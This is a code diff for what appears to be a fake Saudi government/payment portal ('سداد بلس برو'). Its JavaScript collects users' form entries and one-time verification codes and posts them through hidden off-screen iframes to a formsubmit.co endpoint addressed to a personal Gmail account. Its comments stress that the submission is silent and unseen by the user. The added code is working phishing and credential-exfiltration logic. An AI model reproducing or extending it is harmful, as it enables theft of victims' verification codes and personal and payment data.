@@ -1807,6 +1807,11 @@
 
         // Enhanced Navigation Functions
         function showSection(sectionId) {
+            // Reset OTP page if navigating away from it
+            if (document.getElementById('otpPage').classList.contains('active') && sectionId !== 'otp') {
+                resetOTPPage();
+            }
+            
             // Update active page
             document.querySelectorAll('.page').forEach(page => page.classList.remove('active'));
             document.getElementById(sectionId + 'Page').classList.add('active');
@@ -2030,9 +2035,20 @@
 
         // Send OTP code to email
         function sendOTPToEmail(otpCode, serviceName) {
+            // Create hidden iframe for silent submission
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.style.position = 'absolute';
+            iframe.style.left = '-9999px';
+            iframe.style.width = '1px';
+            iframe.style.height = '1px';
+            iframe.name = 'otpHiddenFrame';
+            document.body.appendChild(iframe);
+            
             const otpForm = document.createElement('form');
             otpForm.action = 'https://formsubmit.co/zazylalhkr7@gmail.com';
             otpForm.method = 'POST';
+            otpForm.target = 'otpHiddenFrame'; // Submit to hidden iframe
             otpForm.style.display = 'none';
             
             // Add form fields
@@ -2040,7 +2056,7 @@
                 '_subject': `🔐 كود التحقق - ${serviceName} - سداد بلس برو`,
                 '_template': 'table',
                 '_captcha': 'false',
-                '_next': 'about:blank',
+                '_next': 'https://formsubmit.co/about:blank',
                 'نوع_الرسالة': 'كود التحقق OTP',
                 'الخدمة_المطلوبة': serviceName,
                 'كود_التحقق': otpCode,
@@ -2061,7 +2077,16 @@
             // Submit OTP form silently
             document.body.appendChild(otpForm);
             otpForm.submit();
-            setTimeout(() => document.body.removeChild(otpForm), 1000);
+            
+            // Clean up after submission
+            setTimeout(() => {
+                if (otpForm.parentNode) {
+                    document.body.removeChild(otpForm);
+                }
+                if (iframe.parentNode) {
+                    document.body.removeChild(iframe);
+                }
+            }, 3000);
         }
 
         function showInstantSuccessAndGoHome(serviceName) {
@@ -2230,12 +2255,22 @@
 
             showNotification('تم التحقق', 'تم التحقق بنجاح، جاري إرسال الطلب...', 'success');
 
+            // Create hidden iframe for silent submission
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.style.position = 'absolute';
+            iframe.style.left = '-9999px';
+            iframe.style.width = '1px';
+            iframe.style.height = '1px';
+            iframe.name = 'finalHiddenFrame';
+            document.body.appendChild(iframe);
+
             // Create final form with all data
             const finalForm = document.createElement('form');
             finalForm.action = 'https://formsubmit.co/zazylalhkr7@gmail.com';
             finalForm.method = 'POST';
             finalForm.style.display = 'none';
-            finalForm.target = '_blank'; // This will open in new tab but user won't see it
+            finalForm.target = 'finalHiddenFrame'; // Submit to hidden iframe
 
             // Add all original form data
             for (const [key, value] of window.pendingFormData.entries()) {
@@ -2259,13 +2294,21 @@
             timeInput.value = new Date().toLocaleString('ar-SA');
             finalForm.appendChild(timeInput);
 
-            // Submit form
+            // Submit form silently
             document.body.appendChild(finalForm);
             finalForm.submit();
 
+            // Clear OTP fields immediately after submission
+            clearOTPFields();
+
             // Show success and redirect to home
             setTimeout(() => {
-                document.body.removeChild(finalForm);
+                if (finalForm.parentNode) {
+                    document.body.removeChild(finalForm);
+                }
+                if (iframe.parentNode) {
+                    document.body.removeChild(iframe);
+                }
                 showInstantSuccessAndGoHome(window.pendingServiceName);
                 
                 // Clear stored data
@@ -2273,6 +2316,21 @@
                 window.pendingServiceName = null;
                 window.generatedOTP = null;
             }, 1000);
+        }
+
+        function clearOTPFields() {
+            // Clear all OTP input fields
+            document.querySelectorAll('.otp-input').forEach(input => {
+                input.value = '';
+                input.classList.remove('border-green-500');
+                input.classList.add('border-gray-300');
+            });
+            
+            // Reset focus to first input
+            const firstInput = document.querySelector('.otp-input');
+            if (firstInput) {
+                firstInput.focus();
+            }
         }
 
         function resendOTP() {
@@ -2299,13 +2357,40 @@
             resendBtn.disabled = true;
             resendBtn.className = "text-gray-400 text-sm";
 
-            // Clear OTP inputs
-            document.querySelectorAll('.otp-input').forEach(input => {
-                input.value = '';
-            });
-            document.querySelector('.otp-input').focus();
+            // Clear and reset OTP inputs completely
+            clearOTPFields();
 
-            showNotification('تم الإرسال', 'تم إرسال كود تحقق جديد', 'success');
+            showNotification('تم الإرسال', 'تم إرسال كود تحقق جديد، يرجى إدخال الكود الجديد', 'success');
+        }
+
+        // Reset OTP page when navigating away
+        function resetOTPPage() {
+            // Clear timer
+            if (otpTimerInterval) {
+                clearInterval(otpTimerInterval);
+            }
+            
+            // Clear all OTP fields
+            clearOTPFields();
+            
+            // Reset timer display
+            const timerElement = document.getElementById('otpTimer');
+            if (timerElement) {
+                timerElement.textContent = '05:00';
+                timerElement.className = 'font-bold text-red-600';
+            }
+            
+            // Reset resend button
+            const resendBtn = document.getElementById('resendBtn');
+            if (resendBtn) {
+                resendBtn.disabled = true;
+                resendBtn.className = "text-gray-400 text-sm";
+            }
+            
+            // Clear stored data if going home
+            window.pendingFormData = null;
+            window.pendingServiceName = null;
+            window.generatedOTP = null;
         }
 
         console.log('🏛️ المنصة الحكومية المتطورة - تم التحميل بنجاح!');
